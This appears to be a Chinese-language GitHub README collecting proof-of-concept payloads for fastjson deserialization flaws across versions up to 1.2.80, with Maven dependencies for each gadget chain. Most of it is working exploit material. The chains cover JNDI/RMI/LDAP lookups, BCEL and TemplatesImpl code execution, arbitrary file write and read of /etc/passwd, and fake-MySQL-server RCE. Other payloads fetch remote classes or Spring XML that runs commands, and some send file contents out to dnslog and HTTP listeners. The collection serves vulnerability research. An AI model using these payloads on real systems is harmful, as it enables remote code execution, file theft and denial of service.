# fastjson 全版本漏洞复现
By. Whoopsunix
# Why fastjson？
fastjson复现简单、调用链多，很多时候反而更像是在看其他组件的序列化链，很适合拿来做java研究

所以起了个项目记录自己复现过的POC，既然做了就干脆给出pom依赖，毕竟找环境还是挺麻烦的

后续poc 环境 分析文章在 github 同步
https://github.com/Whoopsunix/fastjson_study

环境见
https://github.com/Whoopsunix/PPPVULNS

+ 值得留意的文章
+  https://github.com/LeadroyaL/fastjson-blacklist fastjson黑白名单
+  https://github.com/safe6Sec/Fastjson  目前最全的poc合集
+  https://github.com/su18/hack-fastjson-1.2.80 1.2.80 POC
+  https://github.com/safe6Sec/Fastjson 1.2.80 poc含环境
+  https://mp.weixin.qq.com/s/5mO1L5o8j_m6RYM6nO-pAA  版本区分
+  https://b1ue.cn/archives/506.html 浅蓝博客

# fastjson <=1.2.24 反序列化代码执行
## JdbcRowSetImpl
```json
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://192.168.16.126:1099/whoopsunix","autoCommit":true}
```

## TemplatesImpl
```json
{
	"@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
	"_bytecodes": ["base64 poc"],
	"_name": "Whoopsunix",
	"_tfactory": {},
	"_outputProperties": {},
}
```

Exec.java
```java
public class Exec extends AbstractTranslet {  
    static {  
        try {  
            Runtime.getRuntime().exec("/System/Applications/Calculator.app/Contents/MacOS/Calculator");  
        } catch (Exception e){  
  
        }  
    }  
  
    @Override  
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {  
  
    }  
  
    @Override  
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {  
  
    }  
}
```

## bcel
```xml
<dependency>  
    <groupId>org.apache.tomcat</groupId>  
    <artifactId>tomcat-dbcp</artifactId>  
    <version>7.0.47</version>  
</dependency>
```

### tomcat 7
```json
{
    {
        "@type": "com.alibaba.fastjson.JSONObject",
        "x":{
                "@type": "org.apache.tomcat.dbcp.dbcp.BasicDataSource",
                "driverClassLoader": {
                    "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
                },
                "driverClassName": "$$BCEL$$"
        }
    }: "x"
}
```

### tomcat 8+
```json
{
    {
        "@type": "com.alibaba.fastjson.JSONObject",
        "x":{
                "@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
                "driverClassLoader": {
                    "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
                },
                "driverClassName": "$$BCEL$$"
        }
    }: "x"
}
```

## spring
### PropertyPathFactoryBean
```xml
<dependency>  
    <groupId>org.springframework.boot</groupId>  
    <artifactId>spring-boot-starter</artifactId>  
</dependency>
```

```json
{
    "@type": "org.springframework.beans.factory.config.PropertyPathFactoryBean",
    "targetBeanName": "rmi://192.168.1.2:1099/whoopsunix",
    "propertyPath": "whoopsunix",
    "beanFactory": {
      "@type": "org.springframework.jndi.support.SimpleJndiBeanFactory",
      "shareableResources": [
        "rmi://192.168.1.2:1099/whoopsunix"
      ]
    }
}
```


### DefaultBeanFactoryPointcutAdvisor
```xml
<dependency>  
    <groupId>org.springframework.boot</groupId>  
    <artifactId>spring-boot-starter</artifactId>  
</dependency>
```

```json
{
  "@type": "org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor",
   "beanFactory": {
     "@type": "org.springframework.jndi.support.SimpleJndiBeanFactory",
     "shareableResources": [
       "rmi://192.168.1.2:1099/whoopsunix"
     ]
   },
   "adviceBeanName": "rmi://192.168.1.2:1099/whoopsunix"
}
```

# fastjson <=1.2.41 反序列化代码执行(黑名单)

开启autotype
`ParserConfig.getGlobalInstance().setAutoTypeSupport(true);`

```json
{"@type":"Lcom.sun.rowset.JdbcRowSetImpl;","dataSourceName":"rmi://192.168.16.126:1099/whoopsunix", "autoCommit":true}
```

#  fastjson <=1.2.42 反序列化代码执行
开启autotype
```json
{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;","dataSourceName":"rmi://192.168.16.126:1099/whoopsunix", "autoCommit":true}
```

# fastjson <=1.2.43 反序列化代码执行
开启autotype
```json
{"@type":"[com.sun.rowset.JdbcRowSetImpl"[{,"dataSourceName":"rmi://192.168.16.126:1099/whoopsunix", "autoCommit":true}
```

# fastjson <=1.2.45 反序列化代码执行
## mybatis
开启autotype
mybatis：3.x.x<3.5.0

```json
{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"rmi://192.168.16.126:1099/whoopsunix"}}
```

# fastjson <=1.2.47 反序列化代码执行
## 缓存通杀
对于1.2.25-1.2.32：需关闭AutoTypeSupport

```json
{
    "a":{
        "@type":"java.lang.Class",
        "val":"com.sun.rowset.JdbcRowSetImpl"
    },
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://192.168.16.126:1099/whoopsunix",
        "autoCommit":true
    }
}
```

## bcel
同样 7 和 8+ payload不一样
```xml
<dependency>  
    <groupId>org.apache.tomcat</groupId>  
    <artifactId>tomcat-dbcp</artifactId>  
    <version>8.5.42</version>  
</dependency>
```

```json
{
    "name":
    {
        "@type" : "java.lang.Class",
        "val"   : "org.apache.tomcat.dbcp.dbcp2.BasicDataSource"
    },
    "x" : {
        "name": {
            "@type" : "java.lang.Class",
            "val"   : "com.sun.org.apache.bcel.internal.util.ClassLoader"
        },
        "y": {
            "@type":"com.alibaba.fastjson.JSONObject",
            "c": {
                "@type":"org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
                "driverClassLoader": {
                    "@type" : "com.sun.org.apache.bcel.internal.util.ClassLoader"
                },
                "driverClassName":"$$BCEL$..",

                     "$ref": "$.x.y.c.connection"
            }
        }
    }
}
```


# Fastjson 1.2.36 - 1.2.62 远程拒绝服务
1.2.62_noneautotype、1.2.60.sec09_noneautotype、1.2.60_noneautotype 同样存在漏洞
```json
{"regex":{"$ref":"$[blue rlike '^[a-zA-Z]+(([a-zA-Z ])?[a-zA-Z]*)*$']"},"blue":"aaaaaaaaaaaaaaaaaaaaaaaaaaaa!"}

{"regex":{"$ref":"$[\blue = /\^[a-zA-Z]+(([a-zA-Z ])?[a-zA-Z]*)*$/]"},"blue":"aaaaaaaaaaaaaaaaaaaaaaaaaaaa!"}
```

# fastjson <= 1.2.60 反序列化代码执行
开启autotype
```xml
<dependency>
    <groupId>commons-configuration</groupId>
    <artifactId>commons-configuration</artifactId>
    <version>1.10</version>
</dependency>
```

```json
{"@type":"org.apache.commons.configuration.JNDIConfiguration","prefix":"rmi://192.168.16.126:1099/whoopsunix"}
```

# fastjson <= 1.2.61 反序列化代码执行
## configuration
开启autotype
```xml
<dependency>
    <groupId>org.apache.commons</groupId>
    <artifactId>commons-configuration2</artifactId>
    <version>2.7</version>
</dependency>
```

```json
{"@type":"org.apache.commons.configuration2.JNDIConfiguration","prefix":"rmi://192.168.16.126:1099/whoopsunix"}
```

# fastjson <=1.2.62 反序列化代码执行
## xbean-reflect(确认版本是否1.2.68可用)
开启autotype
```xml
<dependency>
    <groupId>org.apache.xbean</groupId>
    <artifactId>xbean-reflect</artifactId>
    <version>4.14</version>
</dependency>
```

```json
{"@type":"org.apache.xbean.propertyeditor.JndiConverter","AsText":"rmi://127.0.0.1:1098/whoopsunix"}
```

# fastjson <= 1.2.66 反序列化代码执行
## shiro
开启autotype

```xml
<dependency>
    <groupId>org.apache.shiro</groupId>
    <artifactId>shiro-core</artifactId>
    <version>1.5.3</version>
</dependency>
```

```json
// parseObject
{"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"ldap://192.168.80.1:1389/whoopsunix"}
{"@type":"org.apache.shiro.realm.jndi.JndiRealmFactory", "jndiNames":["ldap://localhost:1389/whoopsunix"], "Realms":[""]}
```

## Anteros
开启autotype
```xml
<dependency>
    <groupId>br.com.anteros</groupId>
    <artifactId>Anteros-Core</artifactId>
    <version>1.2.2</version>
</dependency>
<dependency>
    <groupId>br.com.anteros</groupId>
    <artifactId>Anteros-DBCP</artifactId>
    <version>1.0.1</version>
</dependency>
```

```json
{"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","metricRegistry":"ldap://192.168.80.1:1389/whoopsunix"}
{"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","healthCheckRegistry":"ldap://localhost:1389/whoopsunix"}
```

## ignite-jta
开启autotype
```xml
<dependency>
    <groupId>org.apache.ignite</groupId>
    <artifactId>ignite-jta</artifactId>
    <version>2.7.6</version>
</dependency>
```

```json
{"@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup","jndiNames":"ldap://192.168.80.1:1389/whoopsunix"}
```

# fastjson <= 1.2.67 反序列化代码执行和SSRF漏洞
## shiro
开启autotype
```xml
<dependency>
    <groupId>com.alibaba</groupId>
    <artifactId>fastjson</artifactId>
    <version>1.2.67</version>
    <scope>compile</scope>
</dependency>
<dependency>
    <groupId>org.apache.shiro</groupId>
    <artifactId>shiro-core</artifactId>
    <version>1.5.3</version>
</dependency>
```

```json
{"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"ldap://localhost:1389/whoopsunix","instance":{"$ref":"$.instance"}}
```

## ignite-jta
开启autotype
```xml
<!-- https://mvnrepository.com/artifact/org.apache.ignite/ignite-jta -->
<dependency>
    <groupId>org.apache.ignite</groupId>
    <artifactId>ignite-jta</artifactId>
    <version>2.7.6</version>
</dependency>
```

```json
{"@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup", "jndiNames":["ldap://localhost:1389/whoopsunix"], "tm": {"$ref":"$.tm"}}
```

# fastjson <=1.2.68 反序列化代码执行(AutoCloseable)
## AutoCloseable demo
```json
{"@type":"java.lang.AutoCloseable","@type":"Test","cmd":"/System/Applications/Calculator.app/Contents/MacOS/Calculator"}
```

```java
public class Test implements AutoCloseable{
    public Test(String cmd){
        try {
            Runtime.getRuntime().exec(cmd);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    @Override
    public void close() throws Exception {

    }
}
```

## write file demo(Jdk11)

```json
{
  "@type": "java.lang.AutoCloseable",
  "@type": "java.io.FileOutputStream",
  "file": "/tmp/nonexist",
  "append": "false"
}
```

```json
{
  "@type": "java.lang.AutoCloseable",
  "@type": "java.io.FileWriter",
  "file": "/tmp/nonexist",
  "append": "false"
}
```



## MarshalOutputStream 写文件 需要进一步验证

1.2.70以下jdk11可用

```json
{
    "@type": "java.lang.AutoCloseable",
    "@type": "sun.rmi.server.MarshalOutputStream",
    "out": {
        "@type": "java.util.zip.InflaterOutputStream",
        "out": {
           "@type": "java.io.FileOutputStream",
           "file": "/tmp/asdasd",
           "append": true
        },
        "infl": {
           "input": {
               "array": "eJxLLE5JTCkGAAh5AnE=",
               "limit": 14
           }
        },
        "bufLen": "100"
    },
    "protocolVersion": 1
}
```

## SafeFileOutputStream 文件内容迁移 jdk11测试
target 不存在，temp 存在，则会调用 copy 方法将 temp 的内容迁移到 target
```xml
<dependency>
    <groupId>org.aspectj</groupId>
    <artifactId>aspectjtools</artifactId>
    <version>1.5.4</version>
</dependency>
```

```json
{
    "@type": "java.lang.AutoCloseable",
    "@type": "org.eclipse.core.internal.localstore.SafeFileOutputStream",
    "targetPath": "/Users/whoopsunix/Desktop/test",
    "tempPath": "/Users/whoopsunix/Desktop/pass"
}
```



## SafeFileOutputStream 追加写文件
都不存在，BufferedOutputStream -> targetPath
targetPath存在，tempPath 不存在，BufferedOutputStream -> tempPath
targetPath不存在，tempPath 存在，BufferedOutputStream -> targetPath
targetPath存在，tempPath 存在，BufferedOutputStream -> tempPath，利用io复写绕检测

```xml
<dependency>
    <groupId>org.aspectj</groupId>
    <artifactId>aspectjtools</artifactId>
    <version>1.5.4</version>
</dependency>
<dependency>
    <groupId>com.esotericsoftware</groupId>
    <artifactId>kryo</artifactId>
    <version>4.0.0</version>
</dependency>
<dependency>
    <groupId>com.sleepycat</groupId>
    <artifactId>je</artifactId>
    <version>18.3.12</version>
</dependency>
```

```json
{
    "stream": {
        "@type": "java.lang.AutoCloseable",
        "@type": "org.eclipse.core.internal.localstore.SafeFileOutputStream",
        "targetPath": "C:/Users/whoopsunix/Desktop/ls/ls/4.txt",
        "tempPath": "a"
    },
    "writer": {
        "@type": "java.lang.AutoCloseable",
        "@type": "com.esotericsoftware.kryo.io.Output",
        "buffer": "Y2VzaGk=",
        "outputStream": {
            "$ref": "$.stream"
        },
        "position": 5
    },
    "close": {
        "@type": "java.lang.AutoCloseable",
        "@type": "com.sleepycat.bind.serial.SerialOutput",
        "out": {
            "$ref": "$.writer"
        }
    }
}
```

## Commons IO 2.x 读文件
### 利用报错信息逐个猜解(类似盲注)
byte 十进制ASCII码
```json
{
    "abc": {
				"@type": "java.lang.AutoCloseable",
        "@type": "org.apache.commons.io.input.BOMInputStream",
        "delegate": {
            "@type": "org.apache.commons.io.input.ReaderInputStream",
            "reader": {
                "@type": "jdk.nashorn.api.scripting.URLReader",
                "url": "file:///etc/passwd"
            },
            "charsetName": "UTF-8",
            "bufferSize": 1024
        },
        "boms": [
            {
                "charsetName": "UTF-8",
                "bytes": [
                    60,101
                ]
            }
        ]
    },
    "address": {
        "$ref": "$.abc.BOM"
    }
}
```

```xml
<dependency>
    <groupId>commons-io</groupId>
    <artifactId>commons-io</artifactId>
    <version>2.1</version>
</dependency>
```

文件内容为 test，对应ascii[116,101,115,116]
```json
# 逐位填入bytes，可利用二分法爆破
# 正确则返回base64结果
{"abc":{"bOM":{"bytes":"dGVzdA==","charsetName":"UTF-8"},"bOMCharsetName":"UTF-8"},"address":{"$ref":"$.abc.bOM"}}
# 错误
{"abc":{}}
```



### 利用类型不一致报错
```json
{
    "abc": {
				"@type": "java.lang.AutoCloseable",
        "@type": "org.apache.commons.io.input.BOMInputStream",
        "delegate": {
            "@type": "org.apache.commons.io.input.ReaderInputStream",
            "reader": {
                "@type": "jdk.nashorn.api.scripting.URLReader",
                "url": "file:///etc/passwd"
            },
            "charsetName": "UTF-8",
            "bufferSize": 1024
        },
        "boms": [
            {
                "charsetName": "UTF-8",
                "bytes": [
                    60,101
                ]
            }
        ]
    },
    "address": {
        "@type": "java.lang.AutoCloseable",
        "@type": "org.apache.commons.io.input.CharSequenceReader",
        "charSequence": {
            "@type": "java.lang.String"{"$ref":"$.abc.BOM[0]"},
            "start": 0,
            "end": 0
        }
    }
}
```


### 无回显 对比正确时请求dnslog
https://tyskill.github.io/posts/fastjson%E6%97%A0%E5%9B%9E%E6%98%BE%E8%AF%BB%E6%96%87%E4%BB%B6/
```json
{
  "abc":{"@type": "java.lang.AutoCloseable",
    "@type": "org.apache.commons.io.input.BOMInputStream",
    "delegate": {
	  "@type": "org.apache.commons.io.input.ReaderInputStream",
      "reader": {
		"@type": "jdk.nashorn.api.scripting.URLReader",
        "url": "file:///etc/passwd"
      },
      "charsetName": "UTF-8",
      "bufferSize": 1024
    },"boms": [
      {
        "@type": "org.apache.commons.io.ByteOrderMark",
        "charsetName": "UTF-8",
        "bytes": [116,101,115,116]
      }
    ]
  },
  "address": {
	  "@type": "java.lang.AutoCloseable",
	  "@type": "org.apache.commons.io.input.BOMInputStream",
	  "delegate": {
		"@type": "org.apache.commons.io.input.ReaderInputStream",
		"reader": {
		  "@type": "jdk.nashorn.api.scripting.URLReader",
		  "url": "http://fj.ppp.dnslog.pw"
		},
		"charsetName": "UTF-8",
		"bufferSize": 1024
	  },
	  "boms": [{"$ref":"$.abc.BOM[0]"}]
  },
  "xxx":{"$ref":"$.address.BOM[0]"}
}
```

### 无回显 对比不正确时请求dnslog 很麻烦
```json
{
  "abc":{"@type": "java.lang.AutoCloseable",
    "@type": "org.apache.commons.io.input.BOMInputStream",
    "delegate": {"@type": "org.apache.commons.io.input.ReaderInputStream",
      "reader": { "@type": "jdk.nashorn.api.scripting.URLReader",
        "url": "file:///etc.passwd"
      },
      "charsetName": "UTF-8",
      "bufferSize": 1024
    },"boms": [
      {
        "@type": "org.apache.commons.io.ByteOrderMark",
        "charsetName": "UTF-8",
        "bytes": [
          48,
        ]
      }
    ]
  },
  "address" : {
	"@type": "java.lang.AutoCloseable",
	"@type":"org.apache.commons.io.input.CharSequenceReader",
	"charSequence": {
		"@type": "java.lang.String"{"$ref":"$.abc.BOM[0]"
	},
	"start": 0,
	"end": 0
  },
  "xxx":{{"@type":"java.net.Inet4Address","val":"cnm.awm6.hyuga.icu"}:"xx"}
}

```

## Mysql connect RCE
## Fake Server
> https://github.com/dushixiang/evil-mysql-server
> https://github.com/fnmsd/MySQL_Fake_Server

```xml
<dependency>
    <groupId>mysql</groupId>
    <artifactId>mysql-connector-java</artifactId>
    <version>5.1.11</version>
</dependency>
```

### 5.1.11<=version<=5.1.48
```json
{
    "@type": "java.lang.AutoCloseable",
    "@type": "com.mysql.jdbc.JDBC4Connection",
    "hostToConnectTo": "127.0.0.1",
    "portToConnectTo": 3306,
    "info": {
        "user": "yso_CommonsCollections5_calc",
        "password": "pass",
        "statementInterceptors": "com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor",
        "autoDeserialize": "true",
        "NUM_HOSTS": "1"
    },
    "databaseToConnectTo": "dbname",
    "url": ""
}
```

### 6.0.2 or 6.0.3
```json
{
    "@type": "java.lang.AutoCloseable",
    "@type": "com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection",
    "proxy": {
        "connectionString": {
            "url": "jdbc:mysql://localhost:3306/test?allowLoadLocalInfile=true&autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_CommonsCollections5_/System/Applications/Calculator.app/Contents/MacOS/Calculator"
        }
    }
}
```

### 8.0.19
```json
{
    "@type": "java.lang.AutoCloseable",
    "@type": "com.mysql.cj.jdbc.ha.ReplicationMySQLConnection",
    "proxy": {
        "@type": "com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy",
        "connectionUrl": {
            "@type": "com.mysql.cj.conf.url.ReplicationConnectionUrl",
            "masters": [
                {
                    "host": "127.0.0.1"
                }
            ],
            "slaves": [],
            "properties": {
                "host": "127.0.0.1",
                "user": "yso_CommonsCollections5_calc",
                "dbname": "dbname",
                "password": "pass",
                "queryInterceptors": "com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor",
                "autoDeserialize": "true"
            }
        }
    }
}
```

# fastjson < 1.2.70 反序列化代码执行



# fastjson <= 1.2.80 反序列化代码执行
## groovy RCE
```xml
<dependency>  
    <groupId>org.codehaus.groovy</groupId>  
    <artifactId>groovy</artifactId>  
    <version>3.0.9</version>  
</dependency>
```

新建项目
src/main/java/org/example/GroovyPoc.java
```java
@GroovyASTTransformation(phase = CompilePhase.CONVERSION)  
public class GroovyPoc implements ASTTransformation {  
    public GroovyPoc(){  
        try{  
            Runtime.getRuntime().exec("/System/Applications/Calculator.app/Contents/MacOS/Calculator");  
        }catch (Exception ex){  
  
        }  
    }  
  
    @Override  
    public void visit(ASTNode[] astNodes, SourceUnit sourceUnit) {  
  
    }  
}
```
src/main/resources/META-INF/services/org.codehaus.groovy.transform.ASTTransformation
写入恶意类
```
org.example.GroovyPoc
```

```
mvn install
在classes目录开启http服务
```

poc1
```json
{
    "@type":"java.lang.Exception",
    "@type":"org.codehaus.groovy.control.CompilationFailedException",
    "unit":{}
}
```
poc2
```json
{
    "@type":"org.codehaus.groovy.control.ProcessingUnit",
    "@type":"org.codehaus.groovy.tools.javac.JavaStubCompilationUnit",
    "config":{
        "@type":"org.codehaus.groovy.control.CompilerConfiguration",
        "classpathList":"http://192.168.16.132:1234/"
    }
}
```

## jython
[参考猎鹰](https://mp.weixin.qq.com/s/m2U4zNkLCJvO3l1jChzeFw)
```xml
<!-- https://mvnrepository.com/artifact/org.python/jython -->  
<dependency>  
    <groupId>org.python</groupId>  
    <artifactId>jython</artifactId>  
    <version>2.7.0</version>  
</dependency>
```
### psql
https://mp.weixin.qq.com/s/m2U4zNkLCJvO3l1jChzeFw
```xml
<dependency>  
    <groupId>org.postgresql</groupId>  
    <artifactId>postgresql</artifactId>  
    <version>42.3.1</version>  
</dependency>
```

```json
{
	"a":{
		"@type":"java.lang.Exception",
		"@type":"org.python.antlr.ParseException",
		},
	"b":{
		"@type":"java.lang.Class",
		"val":{"@type":"java.lang.String"{"@type":"java.util.Locale","val":{"@type":"com.alibaba.fastjson.JSONObject",{"@type":"java.lang.String""@type":"org.python.antlr.ParseException",
		"type":{}}}
	},
	"c":{
		"@type":"org.python.core.PyObject",
		"@type":"com.ziclix.python.sql.PyConnection",
		"connection":{
			"@type":"org.postgresql.jdbc.PgConnection",
			"hostSpecs":[{"host":"127.0.0.1","port":2333}],
			"user":"user",
			"database":"test",
			"info":{
				"socketFactory":"org.springframework.context.support.ClassPathXmlApplicationContext",
				"socketFactoryArg":"http://127.0.0.1:1234/exp.xml"
			},
			"url":""
		}
	}
}
```

任意spring bean xml exp，其他payload可[参考](https://gv7.me/articles/2021/some-extensions-of-spring-bean-rce-under-weblogic/)
exp.xml - jndi
```xml
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans
                        http://www.springframework.org/schema/beans/spring-beans.xsd">
	<bean class="javax.naming.InitialContext" factory-method="doLookup">
		<constructor-arg type="java.lang.String" value="ldap://192.168.66.136:1389/9wbfcp"/>
	</bean>
</beans>
```

exp.xml - cmd
```xml
<?xml version="1.0" encoding="UTF-8"?>  
<beans xmlns="http://www.springframework.org/schema/beans"  
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  
       xsi:schemaLocation="http://www.springframework.org/schema/beans  
                        http://www.springframework.org/schema/beans/spring-beans.xsd">  
    <bean id="pb" class="java.lang.ProcessBuilder">  
        <constructor-arg>
            <list>
                <value>cmd.exe</value>  
                <value>/c</value>  
                <value><![CDATA[ calc ]]></value>  
            </list>  
        </constructor-arg>        
        <property name="any" value="#{pb.start()}"/>  
    </bean>
</beans>
```

### mysql
```xml

```

#### 5.1.11<=version<=5.1.48
```json
{
	"a":{
		"@type":"java.lang.Exception",
		"@type":"org.python.antlr.ParseException",
		},
	"b":{
		"@type":"java.lang.Class",
		"val":{"@type":"java.lang.String"{"@type":"java.util.Locale","val":{"@type":"com.alibaba.fastjson.JSONObject",{"@type":"java.lang.String""@type":"org.python.antlr.ParseException",
		"type":{}}}
	},
	"c":{
		"@type":"org.python.core.PyObject",
		"@type":"com.ziclix.python.sql.PyConnection",
		"connection":{
			"@type": "com.mysql.jdbc.JDBC4Connection",
    		"hostToConnectTo": "192.168.66.136",
    		"portToConnectTo": 3306,
	    	"info": {
		        "user": "yso_CommonsCollections4_calc",
		        "password": "pass",
		        "statementInterceptors": "com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor",
		        "autoDeserialize": "true",
		        "NUM_HOSTS": "1"
    		},
    		"databaseToConnectTo": "dbname",
    		"url": ""
		}
	}
}

```

#### 6.0.2 or 6.0.3
```json
{
	"a":{
		"@type":"java.lang.Exception",
		"@type":"org.python.antlr.ParseException",
		},
	"b":{
		"@type":"java.lang.Class",
		"val":{"@type":"java.lang.String"{"@type":"java.util.Locale","val":{"@type":"com.alibaba.fastjson.JSONObject",{"@type":"java.lang.String""@type":"org.python.antlr.ParseException",
		"type":{}}}
	},
	"c":{
		"@type":"org.python.core.PyObject",
		"@type":"com.ziclix.python.sql.PyConnection",
		"connection":{
			"@type":"com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection",
			"proxy": {
        		"connectionString": {
            		"url": "jdbc:mysql://192.168.66.136:3306/test?allowLoadLocalInfile=true&autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_CommonsCollections4_calc"
        		}
    		}
		}
	}
}
```

#### 8.0.19
```json
{
	"a":{
		"@type":"java.lang.Exception",
		"@type":"org.python.antlr.ParseException",
		},
	"b":{
		"@type":"java.lang.Class",
		"val":{"@type":"java.lang.String"{"@type":"java.util.Locale","val":{"@type":"com.alibaba.fastjson.JSONObject",{"@type":"java.lang.String""@type":"org.python.antlr.ParseException",
		"type":{}}}
	},
	"c":{
		"@type":"org.python.core.PyObject",
		"@type":"com.ziclix.python.sql.PyConnection",
		"connection":{
			"@type":"com.mysql.cj.jdbc.ha.ReplicationMySQLConnection",
			"proxy":{
				"@type":"com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy",
				"connectionUrl":{
					"@type":"com.mysql.cj.conf.url.ReplicationConnectionUrl",
					"masters":[{"host":"127.0.0.1"}],
					"slaves":[],
					"properties":{
						"host":"127.0.0.1",
						"port":"3306",
						"connectionAttributes":"t:cb32",
						"user":"yso_CommonsCollections4_calc",
						"dname":"dname",
						"password":"password",
						"queryInterceptors":"com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor",
						"autoDeserialize":"true"
					}
				}
			}
		}
	}
}
```

## AspectJ Tools (Compiler)文件读取
```xml
<dependency>  
    <groupId>org.aspectj</groupId>  
    <artifactId>aspectjtools</artifactId>  
    <version>1.9.8</version>  
</dependency>
```
1.7.0<=version<=1.9.9

poc需要分三次打，web项目可用
poc1
```json
{
    "@type":"java.lang.Exception",
    "@type":"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException"
}
```
poc2
```json
   {
      "@type":"java.lang.Class",
      "val":{
         "@type":"java.lang.String"{
      "@type":"java.util.Locale",
      "val":{
         "@type":"com.alibaba.fastjson.JSONObject",{
      "@type":"java.lang.String"
      "@type":"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException",
      "newAnnotationProcessorUnits":[{}]
   }
}
}
```

根据利用环境有多种poc3
### 有回显
```json
{
    "x":{
        "@type":"org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit",
        "@type":"org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit",
        "fileName":"/etc/passwd"
    }
}
```
### 报错回显
```json
{
  "@type": "java.lang.Character" {
    "C": {
      "x": {
        "@type": "org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit",
        "@type": "org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit",
        "fileName": "/etc/passwd"
      }
    }
  }
}
```

### dnslog
受限于字符，带出失败
```json
{
    "@type":"java.net.Inet4Address",
    "val":{
        "@type":"java.lang.String"{
        "@type":"java.util.Locale",
        "val":{
            "@type":"com.alibaba.fastjson.JSONObject",{
                "@type":"java.lang.String"
                "@type":"java.util.Locale",
                "country":"fj.ppp.dnslog.pw",
                "language":{
                    "@type":"java.lang.String"{
                    "x":{
				"@type": "org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit",
				"@type": "org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit",
				"fileName": "/etc/passwd"
			}
                }
            }
        }
    }
  }
}
}
```

## AspectJ  + cc + ognl  http带出文件
```xml
<dependency>  
    <groupId>ognl</groupId>  
    <artifactId>ognl</artifactId>  
    <version>3.2.21</version>  
</dependency>  
<dependency>  
    <groupId>commons-io</groupId>  
    <artifactId>commons-io</artifactId>  
    <version>2.2</version>  
</dependency>  
  
<dependency>  
    <groupId>org.aspectj</groupId>  
    <artifactId>aspectjtools</artifactId>  
    <version>1.9.8</version>  
</dependency>
```

poc1
```json
[{
		"@type": "java.lang.Exception",
		"@type": "org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException"
	},
	{
		"@type": "java.lang.Class",
		"val": {
			"@type": "java.lang.String" {
				"@type": "java.util.Locale",
				"val": {
					"@type": "com.alibaba.fastjson.JSONObject",
					{
						"@type": "java.lang.String"
						"@type": "org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException",
						"newAnnotationProcessorUnits": [{}]
					}
				}
			},
			{
				"x": {
					"@type": "org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit",
					"@type": "org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit",
					"fileName": "aaa"
				}
			}]
```

poc2
```json
{
	"su14": {
		"@type": "java.lang.Exception",
		"@type": "ognl.OgnlException"
	},
	"su15": {
		"@type": "java.lang.Class",
		"val": {
			"@type": "com.alibaba.fastjson.JSONObject",
			{
				"@type": "java.lang.String"
				"@type": "ognl.OgnlException",
				"_evaluation": ""
			}
		},
		"su16": {
			"@type": "ognl.Evaluation",
			"node": {
				"@type": "ognl.ASTMethod",
				"p": {
					"@type": "ognl.OgnlParser",
					"stream": {
						"@type": "org.apache.commons.io.input.BOMInputStream",
						"delegate": {
							"@type": "org.apache.commons.io.input.ReaderInputStream",
							"reader": {
								"@type": "jdk.nashorn.api.scripting.URLReader",
								"url": {
									"@type": "java.lang.String" {
										"@type": "java.util.Locale",
										"val": {
											"@type": "com.alibaba.fastjson.JSONObject",
											{
												"@type": "java.lang.String"
												"@type": "java.util.Locale",
												"language": "http://192.168.66.136:1234/",
												"country": {
													"@type": "java.lang.String" [{
														"@type": "org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit",
														"fileName": "tmp"
													}]

												}
											}
										},
										"charsetName": "UTF-8",
										"bufferSize": 1024
									},
									"boms": [{
										"@type": "org.apache.commons.io.ByteOrderMark",
										"charsetName": "UTF-8",
										"bytes": [
											0
										]
									}]
								}
							}
						}
					},
					"su17": {
						"$ref": "$.su16.node.p.stream"
					},
					"su18": {
						"$ref": "$.su17.bOM.bytes"
					}
				}
```
带出文件
```
::ffff:192.168.66.136 - - [17/Oct/2022 10:37:49] "GET /_[{"CONTENTS":"FLAG{THIS IS FLAG}","FILENAME":"TMP","MAINTYPENAME":"TMP"}] HTTP/1.1" 400 -
```

## ognl + io读文件
### 利用报错回显 jdk8
类似1.2.68，但实际测试起来效果不太理想
